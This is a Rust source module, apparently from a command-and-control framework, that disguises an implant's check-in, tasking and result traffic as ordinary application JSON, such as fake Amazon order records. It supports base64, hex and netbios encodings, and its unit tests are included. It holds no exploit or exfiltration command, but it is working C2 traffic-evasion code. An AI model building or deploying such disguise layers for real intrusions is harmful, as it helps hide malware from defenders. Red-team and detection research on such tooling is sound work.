//! C2 profile shaping.
//!
//! Port of `features/shaping.go`. A profile's `shaping` block
//! wraps the JSON body of a check-in response, a tasks response,
//! or a results request in a template that looks like a
//! legitimate application response. This module is the pure
//! data-transform layer — it knows nothing about HTTP headers,
//! cookies, status codes, or transports. Those are the
//! transport's job.
//!
//! # Grammar
//!
//! A **template** is an arbitrary JSON value. Any string in the
//! template that is *exactly* `{{payload}}`, `{{ts}}`, or
//! `{{nonce}}` is replaced by the corresponding context value.
//! A string that merely *contains* a placeholder — e.g.
//! `"prefix {{payload}}"` — is left as-is. This is the
//! `^…$` anchor in the Go tree's regex, and the port preserves
//! it.
//!
//! The `{{ts}}` context value is a JSON number (Unix seconds),
//! not a string. A template that places `{{ts}}` at a numeric
//! position gets a number on the wire. This matters for C2
//! profiles that mimic APIs returning `{"timestamp": 1735689600}`
//! rather than `{"timestamp": "1735689600"}`.
//!
//! # Extract path grammar
//!
//! `extract` names a field inside the template with a dot-
//! separated path: `data.b64`, `orders[0].summary`,
//! `data.items[3].title`. Each segment is
//! `[A-Za-z0-9_]+(?:\[\d+\])?`. The trailing `[N]` indexes into
//! an array that was looked up by the preceding key — it is a
//! post-lookup operation, not a leading-index form. A path that
//! starts with `[0]` is rejected; wrap the top-level array in an
//! object and index into it.
//!
//! # Encoding
//!
//! `encoding` selects the transform applied to the payload
//! bytes before they are substituted into the template:
//!
//! | Value | Transform |
//! |---|---|
//! | *(empty)*, `base64` | Standard base64 with padding |
//! | `base64url` | URL-safe base64, no padding |
//! | `hex` | Lowercase hex, two chars per byte |
//! | `netbios` | Each byte as two lowercase a–p letters, one per nibble (low nibble first) |
//!
//! An unrecognised value falls back to base64. `ValidateShapingSpec`
//! catches the round-trip failure that an unknown encoding would
//! otherwise produce.
//!
//! # `\w` divergence
//!
//! Go's `regexp` treats `\w` as `[A-Za-z0-9_]` (ASCII) by
//! default. Rust's `regex` treats `\w` as Unicode-aware by
//! default. This port uses the ASCII class explicitly so that a
//! template or extract path with non-ASCII characters fails
//! identically in both implementations. `shapecheck.py` names
//! this divergence as `EXT002`/`EXT003`; matching Go here closes
//! it at the agent.
//!
//! # `$` divergence
//!
//! Go's `$` matches end-of-string only. Rust's `$` matches
//! end-of-string or just before a trailing `\n`. This port uses
//! `\z` (end-of-string unconditionally) so that `"{{payload}}\n"`
//! is not a placeholder in either implementation. Without this,
//! a template string with a trailing newline would be
//! interpolated by the Rust port and left literal by the Go
//! tree, breaking wire compatibility.
//!
//! # Validation scope
//!
//! [`validate_shaping_spec`] runs a round-trip probe against each
//! shape present on the spec. It is a *runtime* check — the
//! agent calls it during startup against the embedded profile.
//! The Python builder's `shapecheck.py` is the build-time check;
//! it catches a different class of failure (path syntax,
//! placeholder placement, encoding mismatch, cross-profile
//! collisions). Both gates must pass before a profile is
//! deployable.

use std::collections::HashMap;
use std::sync::OnceLock;
use std::time::{SystemTime, UNIX_EPOCH};

use base64::{engine::general_purpose, Engine as _};
use rand::RngCore;
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};
use thiserror::Error;

// =====================================================================
// Public types
// =====================================================================

/// The three shapes a profile may declare.
///
/// Each is optional and independent. A profile that declares only
/// `checkin_response` shapes only check-in responses; the other
/// two fall through to plain JSON at the transport layer.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct ShapingSpec {
    pub checkin_response: Option<ShapeSpec>,
    pub tasks_response: Option<ShapeSpec>,
    pub results_request: Option<ShapeSpec>,
}

/// A single shape — template, extract path, encoding, and
/// placement.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct ShapeSpec {
    /// The template. Any JSON value. A `Value::Null` (from a
    /// missing or `null` field) is treated as "empty template"
    /// by [`validate_shaping_spec`].
    pub template: Value,

    /// The path inside the template where the payload lives.
    /// See the module doc for the grammar.
    pub extract: String,

    /// The payload encoding. Empty means base64.
    pub encoding: String,

    /// Where in the HTTP response the payload rides. Ignored by
    /// the shaping module; the transport reads it. Present here
    /// so the profile deserialises completely.
    pub placement: Option<Placement>,
}

/// Where a shaped response places the payload.
///
/// The shaping module ignores this field; the transport reads it.
/// It is defined here so the profile JSON round-trips without
/// losing the field.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct Placement {
    /// `body` (default), `header`, or `cookie`. An unrecognised
    /// value falls through to `body` at the transport.
    pub kind: String,
    /// The header or cookie name. Empty when `kind` is `body`.
    pub name: String,
}

// =====================================================================
// Errors
// =====================================================================

/// Errors from wrapping, unwrapping, or validating a shape.
#[derive(Debug, Error)]
pub enum ShapingError {
    #[error("json: {0}")]
    Json(#[from] serde_json::Error),

    #[error("bad path segment: {0:?}")]
    BadPathSegment(String),

    #[error("not a map at {part:?} (got {got})")]
    NotAMap { part: String, got: &'static str },

    #[error("extract path segment {0:?} not present in body")]
    MissingKey(String),

    #[error("bad index at {0}")]
    BadIndex(String),

    #[error("extracted value is {got}, not string")]
    ExtractedNotString { got: &'static str },

    #[error("template is empty")]
    EmptyTemplate,

    #[error("netbios payload has odd length")]
    NetbiosOddLength,

    #[error("netbios payload out of range at {0}")]
    NetbiosOutOfRange(usize),

    #[error("base64: {0}")]
    Base64(#[from] base64::DecodeError),

    #[error("hex: {0}")]
    Hex(#[from] hex::FromHexError),

    #[error("{name}: {reason}")]
    ShapeValidation { name: &'static str, reason: String },
}

// =====================================================================
// Regexes
// =====================================================================

/// Matches a string that is *exactly* `{{name}}`.
///
/// `[A-Za-z0-9_]+` rather than `\w+` to match Go's ASCII
/// semantics. `\A…\z` rather than `^…$` to match Go's
/// end-of-string-only `$`. See the module doc.
fn placeholder_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\A\{\{([A-Za-z0-9_]+)\}\}\z")
            .expect("placeholder_re")
    })
}

/// Matches one path segment: `key`, `key[0]`, `key[12]`.
fn path_seg_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\A([A-Za-z0-9_]+)(?:\[([0-9]+)\])?\z")
            .expect("path_seg_re")
    })
}

// =====================================================================
// Wrap / unwrap
// =====================================================================

/// Wrap `payload` in `spec.template`.
///
/// Serialises `payload` to JSON, encodes it under
/// `spec.encoding`, substitutes it for `{{payload}}` in the
/// template, and returns the resulting JSON bytes.
///
/// `payload` is `impl Serialize` so the caller can pass any
/// structured type (`CheckinRequest`, `Task`, `Value`, …). The
/// function does the marshalling; the caller does not need to
/// pre-convert.
pub fn shape_wrap<T: Serialize + ?Sized>(
    spec: &ShapeSpec,
    payload: &T,
) -> Result<Vec<u8>, ShapingError> {
    let inner = serde_json::to_vec(payload)?;

    // Nonce: 8 random bytes, hex-encoded. Fall back to the
    // current nanosecond timestamp on entropy failure, matching
    // the Go tree's `binary.BigEndian.PutUint64` fallback.
    let mut nonce_bytes = [0u8; 8];
    if rand::rngs::OsRng
        .try_fill_bytes(&mut nonce_bytes)
        .is_err()
    {
        nonce_bytes = unix_nanos_be();
    }

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);

    let mut ctx: HashMap<&'static str, Value> = HashMap::with_capacity(3);
    ctx.insert(
        "payload",
        Value::String(encode_payload(&inner, &spec.encoding)),
    );
    ctx.insert("ts", Value::Number(ts.into()));
    ctx.insert("nonce", Value::String(hex::encode(nonce_bytes)));

    if spec.template.is_null() {
        return Err(ShapingError::EmptyTemplate);
    }

    let out = render_shaping(&spec.template, &ctx);
    Ok(serde_json::to_vec(&out)?)
}

/// Unwrap a shaped body.
///
/// Parses `body` as JSON, walks `spec.extract`, decodes the
/// extracted string under `spec.encoding`, and returns the raw
/// payload bytes. The caller decides whether to parse the result
/// as JSON, base64, or something else.
pub fn shape_unwrap(
    body: &[u8],
    spec: &ShapeSpec,
) -> Result<Vec<u8>, ShapingError> {
    let obj: Value = serde_json::from_slice(body)?;
    let value = walk_path(&obj, &spec.extract)?;
    let s = value.as_str().ok_or_else(|| {
        ShapingError::ExtractedNotString {
            got: json_type_name(value),
        }
    })?;
    decode_payload(s, &spec.encoding)
}

// =====================================================================
// Validation
// =====================================================================

/// Validate a shaping spec via round-trip probe.
///
/// For each shape present, renders a probe payload through the
/// template, extracts it back out via the declared `extract`
/// path, and verifies the recovered value equals the probe.
///
/// This is a *runtime* check. The agent's `main()` runs it
/// against the embedded profile at startup; `shapecheck.py` is
/// the *build-time* check and catches a different class of
/// failure. See the module doc for the split.
///
/// The probe uses integer `1` (not `1.0`) so the JSON round-trip
/// preserves the number type under `serde_json`, whose
/// `Number::eq` distinguishes integer and float variants. Go's
/// `float64(1)` marshals as `1`, so integer `1` also matches the
/// wire form the Go tree produces.
pub fn validate_shaping_spec(
    spec: &ShapingSpec,
) -> Result<(), ShapingError> {
    let checks: [(&'static str, &Option<ShapeSpec>); 3] = [
        ("checkin_response", &spec.checkin_response),
        ("tasks_response", &spec.tasks_response),
        ("results_request", &spec.results_request),
    ];

    let probe = serde_json::json!({
        "__probe__": "ok",
        "n": 1,
    });

    for (name, shape) in checks {
        let Some(shape) = shape else { continue };

        if shape.template.is_null() {
            return Err(ShapingError::ShapeValidation {
                name,
                reason: "template is empty".to_string(),
            });
        }
        if shape.extract.is_empty() {
            return Err(ShapingError::ShapeValidation {
                name,
                reason: "extract is required".to_string(),
            });
        }

        let rendered = shape_wrap(shape, &probe).map_err(|e| {
            ShapingError::ShapeValidation {
                name,
                reason: format!("template render: {e}"),
            }
        })?;

        let recovered = shape_unwrap(&rendered, shape).map_err(|e| {
            ShapingError::ShapeValidation {
                name,
                reason: format!("extract {:?}: {e}", shape.extract),
            }
        })?;

        let got: Value =
            serde_json::from_slice(&recovered).map_err(|e| {
                ShapingError::ShapeValidation {
                    name,
                    reason: format!("probe decode: {e}"),
                }
            })?;

        if got != probe {
            return Err(ShapingError::ShapeValidation {
                name,
                reason: format!(
                    "round-trip mismatch (got {got:?}, want {probe:?})"
                ),
            });
        }
    }

    Ok(())
}

// =====================================================================
// Template rendering
// =====================================================================

/// Recursively walk `node` and substitute exact placeholders.
///
/// Only strings that match `\A\{\{(\w+)\}\}\z` are considered.
/// A string that merely contains a placeholder is left as-is.
/// Values from `ctx` may be strings, numbers, or any other JSON
/// value — the substitution is a straight clone, not a
/// stringification, so `{{ts}}` produces a number at a numeric
/// template position.
fn render_shaping(
    node: &Value,
    ctx: &HashMap<&'static str, Value>,
) -> Value {
    match node {
        Value::Object(map) => {
            let mut out = Map::with_capacity(map.len());
            for (k, v) in map {
                out.insert(k.clone(), render_shaping(v, ctx));
            }
            Value::Object(out)
        }
        Value::Array(arr) => Value::Array(
            arr.iter().map(|v| render_shaping(v, ctx)).collect(),
        ),
        Value::String(s) => {
            if let Some(caps) = placeholder_re().captures(s) {
                if let Some(val) = ctx.get(&caps[1]) {
                    return val.clone();
                }
            }
            Value::String(s.clone())
        }
        other => other.clone(),
    }
}

// =====================================================================
// Path walker
// =====================================================================

/// Walk `obj` by the dot-separated `path`.
///
/// Each segment is `key` or `key[N]`. The `[N]` applies to the
/// value looked up by `key` — it does not index into the parent.
fn walk_path<'a>(
    obj: &'a Value,
    path: &str,
) -> Result<&'a Value, ShapingError> {
    let mut cur = obj;
    for part in path.split('.') {
        let caps = path_seg_re().captures(part).ok_or_else(|| {
            ShapingError::BadPathSegment(part.to_string())
        })?;
        let key = &caps[1];
        let idx = caps.get(2).map(|m| m.as_str());

        let map = cur.as_object().ok_or_else(|| {
            ShapingError::NotAMap {
                part: part.to_string(),
                got: json_type_name(cur),
            }
        })?;
        let next = map.get(key).ok_or_else(|| {
            ShapingError::MissingKey(part.to_string())
        })?;
        cur = next;

        if let Some(idx_str) = idx {
            // The regex guarantees `idx_str` is `[0-9]+`, so
            // `parse` cannot fail; the `unwrap_or(0)` matches
            // the Go tree's `idx, _ := strconv.Atoi(idxStr)`.
            let idx: usize = idx_str.parse().unwrap_or(0);
            let arr = cur.as_array().ok_or_else(|| {
                ShapingError::BadIndex(part.to_string())
            })?;
            if idx >= arr.len() {
                return Err(ShapingError::BadIndex(part.to_string()));
            }
            cur = &arr[idx];
        }
    }
    Ok(cur)
}

// =====================================================================
// Encoding
// =====================================================================

/// Encode `raw` under `encoding`.
///
/// Recognised values: `base64url`, `hex`, `netbios`. Everything
/// else (including the empty string and the explicit `base64`)
/// is standard base64. Case-insensitive, matching the Go tree's
/// `strings.ToLower`.
pub fn encode_payload(raw: &[u8], encoding: &str) -> String {
    match encoding.to_ascii_lowercase().as_str() {
        "base64url" => general_purpose::URL_SAFE_NO_PAD.encode(raw),
        "hex" => hex::encode(raw),
        "netbios" => {
            let mut out = String::with_capacity(raw.len() * 2);
            for &b in raw {
                out.push((b'a' + (b & 0x0f)) as char);
                out.push((b'a' + ((b >> 4) & 0x0f)) as char);
            }
            out
        }
        _ => general_purpose::STANDARD.encode(raw),
    }
}

/// Decode `encoded` under `encoding`.
///
/// Inverse of [`encode_payload`]. An unknown encoding is
/// treated as base64, matching the Go tree. NetBIOS decode
/// rejects an odd-length string and any character outside
/// `a`–`p`.
pub fn decode_payload(
    encoded: &str,
    encoding: &str,
) -> Result<Vec<u8>, ShapingError> {
    match encoding.to_ascii_lowercase().as_str() {
        "base64url" => {
            Ok(general_purpose::URL_SAFE_NO_PAD.decode(encoded)?)
        }
        "hex" => Ok(hex::decode(encoded)?),
        "netbios" => {
            if encoded.len() % 2 != 0 {
                return Err(ShapingError::NetbiosOddLength);
            }
            let bytes = encoded.as_bytes();
            let mut out = Vec::with_capacity(encoded.len() / 2);
            for i in (0..encoded.len()).step_by(2) {
                let low = (bytes[i] as i32) - (b'a' as i32);
                let high = (bytes[i + 1] as i32) - (b'a' as i32);
                if !(0..=15).contains(&low) || !(0..=15).contains(&high)
                {
                    return Err(ShapingError::NetbiosOutOfRange(i));
                }
                out.push((low as u8) | ((high as u8) << 4));
            }
            Ok(out)
        }
        _ => Ok(general_purpose::STANDARD.decode(encoded)?),
    }
}

// =====================================================================
// Helpers
// =====================================================================

/// The JSON type name, for error messages. Matches Go's `%T`
/// closely enough for a diagnostic; the exact string differs
/// (Go prints `float64`, this prints `number`) but the identity
/// of the type is unambiguous.
fn json_type_name(v: &Value) -> &'static str {
    match v {
        Value::Null => "null",
        Value::Bool(_) => "bool",
        Value::Number(_) => "number",
        Value::String(_) => "string",
        Value::Array(_) => "array",
        Value::Object(_) => "object",
    }
}

/// Nanoseconds since the Unix epoch, big-endian.
///
/// Fallback for the nonce when `OsRng` fails. Matches the Go
/// tree's `binary.BigEndian.PutUint64(nb[:], uint64(time.Now().UnixNano()))`.
fn unix_nanos_be() -> [u8; 8] {
    let ns = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0);
    ns.to_be_bytes()
}

// =====================================================================
// Tests
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn spec(template: Value, extract: &str, encoding: &str) -> ShapeSpec {
        ShapeSpec {
            template,
            extract: extract.to_string(),
            encoding: encoding.to_string(),
            placement: None,
        }
    }

    // -------------------- encoding round-trips --------------------

    #[test]
    fn encoding_base64_round_trip() {
        for raw in [
            b"".as_slice(),
            b"hello",
            b"\x00\x01\x02\xff\xfe",
        ] {
            let enc = encode_payload(raw, "");
            let dec = decode_payload(&enc, "").unwrap();
            assert_eq!(dec, raw);
        }
    }

    #[test]
    fn encoding_base64url_round_trip() {
        for raw in [b"".as_slice(), b"hello", b"\x00\x01\x02\xff"] {
            let enc = encode_payload(raw, "base64url");
            assert!(!enc.contains('+'), "base64url must not contain +");
            assert!(!enc.contains('/'), "base64url must not contain /");
            assert!(!enc.contains('='), "base64url must not contain =");
            let dec = decode_payload(&enc, "base64url").unwrap();
            assert_eq!(dec, raw);
        }
    }

    #[test]
    fn encoding_hex_round_trip() {
        for raw in [b"".as_slice(), b"\x00\x01\xff"] {
            let enc = encode_payload(raw, "hex");
            let dec = decode_payload(&enc, "hex").unwrap();
            assert_eq!(dec, raw);
        }
    }

    #[test]
    fn encoding_netbios_round_trip() {
        // Low nibble first, then high nibble. 0x12 -> 'c' 'b'.
        let enc = encode_payload(&[0x12], "netbios");
        assert_eq!(enc, "cb");
        let dec = decode_payload("cb", "netbios").unwrap();
        assert_eq!(dec, vec![0x12]);

        // Full range.
        let raw: Vec<u8> = (0u8..=255).collect();
        let enc = encode_payload(&raw, "netbios");
        assert_eq!(enc.len(), raw.len() * 2);
        let dec = decode_payload(&enc, "netbios").unwrap();
        assert_eq!(dec, raw);
    }

    #[test]
    fn encoding_unknown_falls_back_to_base64() {
        let enc = encode_payload(b"hello", "not-a-thing");
        let dec = decode_payload(&enc, "not-a-thing").unwrap();
        assert_eq!(dec, b"hello");
    }

    #[test]
    fn encoding_is_case_insensitive() {
        assert_eq!(
            encode_payload(b"h", "BASE64URL"),
            encode_payload(b"h", "base64url"),
        );
        assert_eq!(
            encode_payload(b"h", "Hex"),
            encode_payload(b"h", "hex"),
        );
    }

    #[test]
    fn netbios_odd_length_rejected() {
        let err = decode_payload("c", "netbios");
        assert!(matches!(err, Err(ShapingError::NetbiosOddLength)));
    }

    #[test]
    fn netbios_out_of_range_rejected() {
        // 'q' is one past 'p'.
        let err = decode_payload("cq", "netbios");
        assert!(matches!(
            err,
            Err(ShapingError::NetbiosOutOfRange(1))
        ));

        // Uppercase not accepted.
        let err = decode_payload("CB", "netbios");
        assert!(matches!(
            err,
            Err(ShapingError::NetbiosOutOfRange(_))
        ));
    }

    // -------------------- placeholder rendering --------------------

    fn ctx_of(payload: &str, ts: i64, nonce: &str) -> HashMap<&'static str, Value> {
        let mut m = HashMap::new();
        m.insert("payload", Value::String(payload.to_string()));
        m.insert("ts", Value::Number(ts.into()));
        m.insert("nonce", Value::String(nonce.to_string()));
        m
    }

    #[test]
    fn exact_placeholder_substituted() {
        let ctx = ctx_of("XYZ", 123, "abc");
        let tmpl = serde_json::json!({"data": "{{payload}}"});
        let out = render_shaping(&tmpl, &ctx);
        assert_eq!(out, serde_json::json!({"data": "XYZ"}));
    }

    #[test]
    fn prefix_placeholder_left_literal() {
        // Go's regex is whole-string only; a containing string
        // is not interpolated.
        let ctx = ctx_of("XYZ", 123, "abc");
        let tmpl = serde_json::json!({"data": "prefix {{payload}}"});
        let out = render_shaping(&tmpl, &ctx);
        assert_eq!(
            out,
            serde_json::json!({"data": "prefix {{payload}}"})
        );
    }

    #[test]
    fn ts_substituted_as_number_not_string() {
        let ctx = ctx_of("XYZ", 1735689600, "abc");
        let tmpl = serde_json::json!({"when": "{{ts}}"});
        let out = render_shaping(&tmpl, &ctx);
        assert_eq!(
            out,
            serde_json::json!({"when": 1735689600i64})
        );
        // Belt and braces: the output is a number, not a
        // string that happens to look like one.
        assert!(out["when"].is_number());
    }

    #[test]
    fn unknown_placeholder_left_literal() {
        let ctx = ctx_of("XYZ", 123, "abc");
        let tmpl = serde_json::json!({"data": "{{unknown}}"});
        let out = render_shaping(&tmpl, &ctx);
        assert_eq!(out, serde_json::json!({"data": "{{unknown}}"}));
    }

    #[test]
    fn non_ascii_placeholder_left_literal() {
        // Go's \w is ASCII; matching that means a placeholder
        // containing a non-ASCII character is not interpolated.
        let ctx = ctx_of("XYZ", 123, "abc");
        let tmpl = serde_json::json!({"data": "{{\u{00e9}}"});
        let out = render_shaping(&tmpl, &ctx);
        assert_eq!(out, tmpl);
    }

    #[test]
    fn trailing_newline_breaks_placeholder_match() {
        // Go's $ is end-of-string. The port uses \z to
        // preserve this; a template string with a trailing
        // newline must not be interpolated.
        let ctx = ctx_of("XYZ", 123, "abc");
        let tmpl = serde_json::json!({"data": "{{payload}}\n"});
        let out = render_shaping(&tmpl, &ctx);
        assert_eq!(
            out,
            serde_json::json!({"data": "{{payload}}\n"})
        );
    }

    #[test]
    fn nested_arrays_and_objects() {
        let ctx = ctx_of("X", 1, "abc");
        let tmpl = serde_json::json!({
            "a": [
                {"b": "{{payload}}"},
                ["{{ts}}", "literal"],
            ],
            "c": 42,
            "d": true,
            "e": null,
        });
        let out = render_shaping(&tmpl, &ctx);
        assert_eq!(
            out,
            serde_json::json!({
                "a": [
                    {"b": "X"},
                    [1, "literal"],
                ],
                "c": 42,
                "d": true,
                "e": null,
            })
        );
    }

    // -------------------- path walker --------------------

    #[test]
    fn walk_simple() {
        let v = serde_json::json!({"data": {"b64": "hello"}});
        assert_eq!(
            walk_path(&v, "data.b64").unwrap(),
            &serde_json::json!("hello"),
        );
    }

    #[test]
    fn walk_array_index() {
        let v = serde_json::json!({
            "orders": [
                {"summary": "first"},
                {"summary": "second"},
            ]
        });
        assert_eq!(
            walk_path(&v, "orders[1].summary").unwrap(),
            &serde_json::json!("second"),
        );
    }

    #[test]
    fn walk_missing_key() {
        let v = serde_json::json!({"data": {}});
        let err = walk_path(&v, "data.b64");
        assert!(matches!(err, Err(ShapingError::MissingKey(_))));
    }

    #[test]
    fn walk_bad_segment() {
        let v = serde_json::json!({"data": "x"});
        for bad in ["[0]", "a b", "a-b", "a!"] {
            let err = walk_path(&v, bad);
            assert!(
                matches!(err, Err(ShapingError::BadPathSegment(_))),
                "input = {bad:?}",
            );
        }
    }

    #[test]
    fn walk_not_a_map() {
        let v = serde_json::json!({"data": "string"});
        let err = walk_path(&v, "data.b64");
        assert!(matches!(err, Err(ShapingError::NotAMap { .. })));
    }

    #[test]
    fn walk_bad_index() {
        let v = serde_json::json!({"items": [1, 2]});
        let err = walk_path(&v, "items[5]");
        assert!(matches!(err, Err(ShapingError::BadIndex(_))));
    }

    #[test]
    fn walk_non_ascii_key_rejected() {
        // Go's \w is ASCII; a non-ASCII key fails the segment
        // grammar in both implementations.
        let v = serde_json::json!({"\u{00e9}": "x"});
        let err = walk_path(&v, "\u{00e9}");
        assert!(matches!(err, Err(ShapingError::BadPathSegment(_))));
    }

    // -------------------- wrap / unwrap round-trip --------------------

    #[test]
    fn wrap_unwrap_round_trip() {
        let s = spec(
            serde_json::json!({
                "data": {"envelope": {"b64": "{{payload}}"}},
                "ts": "{{ts}}",
            }),
            "data.envelope.b64",
            "base64",
        );
        let payload = serde_json::json!({"hello": "world"});
        let wrapped = shape_wrap(&s, &payload).unwrap();
        let unwrapped = shape_unwrap(&wrapped, &s).unwrap();
        let recovered: Value = serde_json::from_slice(&unwrapped).unwrap();
        assert_eq!(recovered, payload);
    }

    #[test]
    fn wrap_unwrap_netbios() {
        let s = spec(
            serde_json::json!({"data": {"b64": "{{payload}}"}}),
            "data.b64",
            "netbios",
        );
        let payload = serde_json::json!({"n": 1});
        let wrapped = shape_wrap(&s, &payload).unwrap();
        let unwrapped = shape_unwrap(&wrapped, &s).unwrap();
        let recovered: Value = serde_json::from_slice(&unwrapped).unwrap();
        assert_eq!(recovered, payload);
    }

    #[test]
    fn wrap_unwrap_header_placement_ignored() {
        // The shaping module ignores placement; the transport
        // reads it. Verify the wrap/unwrap still works with a
        // placement block present.
        let mut s = spec(
            serde_json::json!({"data": "{{payload}}"}),
            "data",
            "",
        );
        s.placement = Some(Placement {
            kind: "header".to_string(),
            name: "X-Request-ID".to_string(),
        });
        let payload = serde_json::json!({"x": 1});
        let wrapped = shape_wrap(&s, &payload).unwrap();
        let unwrapped = shape_unwrap(&wrapped, &s).unwrap();
        let recovered: Value = serde_json::from_slice(&unwrapped).unwrap();
        assert_eq!(recovered, payload);
    }

    #[test]
    fn wrap_empty_template_errors() {
        let s = spec(Value::Null, "data", "");
        let err = shape_wrap(&s, &serde_json::json!({}));
        assert!(matches!(err, Err(ShapingError::EmptyTemplate)));
    }

    // -------------------- spec validation --------------------

    #[test]
    fn validate_passes_on_empty_spec() {
        let spec = ShapingSpec::default();
        assert!(validate_shaping_spec(&spec).is_ok());
    }

    #[test]
    fn validate_passes_on_well_formed_checkin() {
        let spec = ShapingSpec {
            checkin_response: Some(spec(
                serde_json::json!({
                    "data": {"envelope": {"b64": "{{payload}}"}},
                }),
                "data.envelope.b64",
                "base64",
            )),
            ..Default::default()
        };
        assert!(validate_shaping_spec(&spec).is_ok());
    }

    #[test]
    fn validate_rejects_empty_template() {
        let spec = ShapingSpec {
            checkin_response: Some(ShapeSpec {
                template: Value::Null,
                extract: "data".to_string(),
                encoding: String::new(),
                placement: None,
            }),
            ..Default::default()
        };
        let err = validate_shaping_spec(&spec);
        match err {
            Err(ShapingError::ShapeValidation { name, reason }) => {
                assert_eq!(name, "checkin_response");
                assert!(reason.contains("template is empty"));
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn validate_rejects_empty_extract() {
        let spec = ShapingSpec {
            tasks_response: Some(ShapeSpec {
                template: serde_json::json!({"data": "{{payload}}"}),
                extract: String::new(),
                encoding: String::new(),
                placement: None,
            }),
            ..Default::default()
        };
        let err = validate_shaping_spec(&spec);
        match err {
            Err(ShapingError::ShapeValidation { name, reason }) => {
                assert_eq!(name, "tasks_response");
                assert!(reason.contains("extract is required"));
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn validate_rejects_extract_pointing_at_wrong_field() {
        // Template has {{payload}} at data.envelope.b64, but
        // extract points at data.b64 — a plausible-looking
        // sibling that does not exist.
        let spec = ShapingSpec {
            results_request: Some(spec(
                serde_json::json!({
                    "data": {
                        "envelope": {"b64": "{{payload}}"},
                        "b64": "static",
                    }
                }),
                "data.b64",
                "base64",
            )),
            ..Default::default()
        };
        let err = validate_shaping_spec(&spec);
        match err {
            Err(ShapingError::ShapeValidation { name, reason }) => {
                assert_eq!(name, "results_request");
                // The extract succeeds (data.b64 is a string)
                // but the decoded payload is "static", which
                // does not parse as the probe JSON. The
                // failure surfaces at probe decode or at
                // round-trip comparison — either names the
                // shape.
                assert!(
                    reason.contains("probe decode")
                        || reason.contains("round-trip mismatch"),
                    "reason = {reason}",
                );
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn validate_rejects_bad_extract_path() {
        let spec = ShapingSpec {
            checkin_response: Some(spec(
                serde_json::json!({"data": "{{payload}}"}),
                "[0]",  // leading index, not allowed
                "",
            )),
            ..Default::default()
        };
        let err = validate_shaping_spec(&spec);
        match err {
            Err(ShapingError::ShapeValidation { name, reason }) => {
                assert_eq!(name, "checkin_response");
                assert!(reason.contains("bad path segment"));
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    // -------------------- JSON deserialisation --------------------

    #[test]
    fn spec_deserialises_from_profile_json() {
        // The exact shape the README's amazon profile uses.
        let json = r#"{
            "checkin_response": {
                "template": {
                    "orders": [{
                        "orderId": "100-0000000-0000000",
                        "orderDate": "{{ts}}",
                        "summary": "{{payload}}",
                        "status": "DELIVERED"
                    }]
                },
                "extract": "orders[0].summary"
            },
            "tasks_response": {
                "template": {
                    "cart": {
                        "items": [{"title": "{{payload}}"}]
                    }
                },
                "extract": "cart.items[0].title",
                "encoding": "base64url",
                "placement": {"kind": "header", "name": "X-Request-ID"}
            }
        }"#;
        let spec: ShapingSpec = serde_json::from_str(json).unwrap();
        assert!(spec.checkin_response.is_some());
        assert!(spec.tasks_response.is_some());
        assert!(spec.results_request.is_none());

        let tasks = spec.tasks_response.as_ref().unwrap();
        assert_eq!(tasks.encoding, "base64url");
        assert_eq!(tasks.placement.as_ref().unwrap().kind, "header");
        assert_eq!(
            tasks.placement.as_ref().unwrap().name,
            "X-Request-ID",
        );

        assert!(validate_shaping_spec(&spec).is_ok());
    }

    #[test]
    fn spec_defaults_missing_fields() {
        let json = r#"{
            "checkin_response": {
                "template": {"data": "{{payload}}"},
                "extract": "data"
            }
        }"#;
        let spec: ShapingSpec = serde_json::from_str(json).unwrap();
        let c = spec.checkin_response.as_ref().unwrap();
        assert_eq!(c.encoding, "");
        assert!(c.placement.is_none());
    }
}